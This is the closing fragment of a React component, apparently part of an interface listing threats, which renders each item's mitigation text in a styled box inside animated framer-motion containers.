                    <div className="bg-emerald-500/5 border border-emerald-500/10 rounded-xl p-4 text-sm text-emerald-300/80 leading-relaxed">{t.mitigation}</div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      ))}
    </div>
  )
}
